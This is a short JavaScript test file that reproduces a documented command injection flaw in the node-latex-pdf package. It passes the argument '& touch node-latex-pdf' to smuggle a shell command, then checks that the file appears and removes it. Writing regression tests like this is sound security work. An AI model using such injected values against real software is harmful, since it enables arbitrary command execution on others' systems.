//https://snyk.io/vuln/SNYK-JS-NODELATEXPDF-1050426
test("Command Injection in node-latex-pdf", () => 
{
	const a =require("node-latex-pdf");
	const fs = require('fs')
	const path = './node-latex-pdf'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	a("./","& touch node-latex-pdf", function(){ 
		//checking that its created by after exploit.
		file_exist = fs.existsSync(path);
		expect(file_exist).toBe(true);

		fs.unlinkSync(path);//deleting the file after creation
	})
		
});
